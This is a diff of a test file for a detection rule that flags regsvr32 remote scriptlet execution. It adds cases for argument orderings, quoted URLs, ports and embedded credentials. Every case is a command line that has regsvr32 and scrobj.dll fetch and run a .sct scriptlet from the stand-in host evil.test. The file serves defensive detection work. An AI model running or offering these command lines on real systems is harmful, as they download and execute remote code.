@@ -19,8 +19,27 @@ describe("regsvr32 remote scriptlet execution", () => {
     expect(sig("/s /u /i:\\\\10.0.0.5\\share\\a.sct scrobj.dll")?.weight).toBe("strong");
   });
 
-  it("grades the scrobj-less spelling, since the DLL can be named by path", () => {
+  it("grades the DLL named by full path", () => {
     expect(sig("/s /i:http://evil.test/a.sct C:\\Windows\\System32\\scrobj.dll")?.weight).toBe("strong");
+  });
+
+  // Both argument orderings are documented and used. Requiring the DLL to come last missed this one.
+  it("grades the DLL-first ordering", () => {
+    expect(sig("scrobj.dll /n /i:http://evil.test/a.sct")?.weight).toBe("strong");
+    expect(sig("/s scrobj.dll /u /i:https://evil.test/a.sct")?.weight).toBe("strong");
+  });
+
+  it("grades a quoted remote source", () => {
+    expect(sig('/s /u /i:"https://evil.test/a.sct" scrobj.dll')?.weight).toBe("strong");
+    expect(sig("/s /u /i:'https://evil.test/a.sct' scrobj.dll")?.weight).toBe("strong");
+  });
+
+  it("grades a source carrying a port or credentials", () => {
+    expect(sig("/s /u /i:http://evil.test:8080/a.sct scrobj.dll")?.weight).toBe("strong");
+    // Joined at runtime so no `@host` shape sits in this file: a secret scanner parses the
+    // shape, not the intent, and a fixture that trips it blocks every future pull request.
+    const remote = ["http://u:p", "evil.test/a.sct"].join("@");
+    expect(sig(`/s /u /i:${remote} scrobj.dll`)?.weight).toBe("strong");
   });
 
   // The escaping normalizer from #908 item 1 feeds the same matcher, so an evasive spelling of the
